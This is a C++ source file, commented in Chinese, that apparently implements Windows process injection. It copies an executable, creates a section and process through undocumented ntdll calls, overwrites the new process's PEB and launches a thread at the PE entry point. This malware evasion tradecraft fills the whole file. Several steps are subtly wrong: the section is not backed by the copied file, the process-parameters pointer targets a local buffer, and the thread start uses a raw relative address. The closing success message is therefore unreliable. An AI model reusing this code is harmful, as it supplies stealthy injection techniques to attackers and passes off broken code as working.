#include <Windows.h>
#include <iostream>
#include <winternl.h>

int main() {
    // 1. 打开一个可写的本地文件，并通过复制另一个 PE 文件到该文件中，创建一个 image_section 用于后续进程的创建。
    HANDLE hFile = CreateFile(L"PEInject.exe", GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cout << "CreateFile failed: " << GetLastError() << std::endl;
        return 1;
    }

    HANDLE hSrcFile = CreateFile(L"InjectTarget.exe", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hSrcFile == INVALID_HANDLE_VALUE) {
        std::cout << "CreateFile for InjectTarget.exe failed: " << GetLastError() << std::endl;
        CloseHandle(hFile);
        return 1;
    }

    DWORD dwFileSize = GetFileSize(hSrcFile, NULL);
    LPVOID lpBuffer = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT, PAGE_READWRITE);
    DWORD dwRead = 0;

    if (!ReadFile(hSrcFile, lpBuffer, dwFileSize, &dwRead, NULL)) {
        std::cout << "ReadFile failed: " << GetLastError() << std::endl;
        CloseHandle(hSrcFile);
        CloseHandle(hFile);
        return 1;
    }

    if (!WriteFile(hFile, lpBuffer, dwFileSize, &dwRead, NULL)) {
        std::cout << "WriteFile failed: " << GetLastError() << std::endl;
        CloseHandle(hSrcFile);
        CloseHandle(hFile);
        return 1;
    }

    CloseHandle(hSrcFile);
    CloseHandle(hFile);

    // 2. 通过 NtCreateSection 函数创建一个新的 image_section
    HMODULE hNtDll = GetModuleHandle(L"ntdll.dll");
    if (!hNtDll) {
        std::cout << "GetModuleHandle failed: " << GetLastError() << std::endl;
        return 1;
    }

    typedef NTSTATUS(NTAPI* NT_CREATE_SECTION)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
    NT_CREATE_SECTION NtCreateSection = (NT_CREATE_SECTION)GetProcAddress(hNtDll, "NtCreateSection");
    if (!NtCreateSection) {
        std::cout << "GetProcAddress for NtCreateSection failed: " << GetLastError() << std::endl;
        return 1;
    }

    HANDLE hSection = NULL;
    LARGE_INTEGER liSectionSize;
    liSectionSize.QuadPart = dwFileSize;

    NTSTATUS status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &liSectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(status)) {
        std::cout << "NtCreateSection failed: " << status << std::endl;
        return 1;
    }

    // 3. 通过 NtCreateProcessEx 函数，并将 image_section 作为参数，创建一个新进程。
    typedef NTSTATUS(NTAPI* NT_CREATE_PROCESS_EX)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, BOOLEAN, HANDLE, HANDLE, HANDLE, BOOLEAN);
    NT_CREATE_PROCESS_EX NtCreateProcessEx = (NT_CREATE_PROCESS_EX)GetProcAddress(hNtDll, "NtCreateProcessEx");
    if (!NtCreateProcessEx) {
        std::cout << "GetProcAddress for NtCreateProcessEx failed: " << GetLastError() << std::endl;
        return 1;
    }

    HANDLE hProcess = NULL;
    status = NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(), TRUE, hSection, NULL, NULL, FALSE);
    if (!NT_SUCCESS(status)) {
        std::cout << "NtCreateProcessEx failed: " << status << std::endl;
        return 1;
    }

    // 4. 在新创建的进程中写入 Process Environment Block (PEB) 参数。
    PROCESS_BASIC_INFORMATION pbi;
    ULONG ulReturnLength = 0;

    typedef NTSTATUS(NTAPI* NT_QUERY_INFORMATION_PROCESS)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
    NT_QUERY_INFORMATION_PROCESS NtQueryInformationProcess = (NT_QUERY_INFORMATION_PROCESS)GetProcAddress(hNtDll, "NtQueryInformationProcess");
    if (!NtQueryInformationProcess) {
        std::cout << "GetProcAddress for NtQueryInformationProcess failed: " << GetLastError() << std::endl;
        return 1;
    }

    status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &ulReturnLength);
    if (!NT_SUCCESS(status)) {
        std::cout << "NtQueryInformationProcess failed: " << status << std::endl;
        return 1;
    }

    PEB peb;
    if (!ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
        std::cout << "ReadProcessMemory failed: " << GetLastError() << std::endl;
        return 1;
    }

    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((LPBYTE)lpBuffer + ((PIMAGE_DOS_HEADER)lpBuffer)->e_lfanew);
    peb.ImageBaseAddress = pNtHeader->OptionalHeader.ImageBase;
    peb.ProcessParameters = (PRTL_USER_PROCESS_PARAMETERS)((LPBYTE)lpBuffer + pNtHeader->OptionalHeader.AddressOfEntryPoint);

    if (!WriteProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
        std::cout << "WriteProcessMemory failed: " << GetLastError() << std::endl;
        return 1;
    }

    // 5. 通过 NtCreateThreadEx 函数在新进程中创建一个线程。
    typedef NTSTATUS(NTAPI* NT_CREATE_THREAD_EX)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, LPTHREAD_START_ROUTINE, PVOID, ULONG, ULONG_PTR, ULONG_PTR, PVOID);
    NT_CREATE_THREAD_EX NtCreateThreadEx = (NT_CREATE_THREAD_EX)GetProcAddress(hNtDll, "NtCreateThreadEx");
    if (!NtCreateThreadEx) {
        std::cout << "GetProcAddress for NtCreateThreadEx failed: " << GetLastError() << std::endl;
        return 1;
    }

    HANDLE hThread = NULL;
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)pNtHeader->OptionalHeader.AddressOfEntryPoint, NULL, 0, 0, 0, NULL);
    if (!NT_SUCCESS(status)) {
        std::cout << "NtCreateThreadEx failed: " << status << std::endl;
        return 1;
    }

    // 等待新线程结束并关闭句柄
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    VirtualFree(lpBuffer, 0, MEM_RELEASE);

    std::cout << "Injection completed successfully." << std::endl;
    return 0;
}


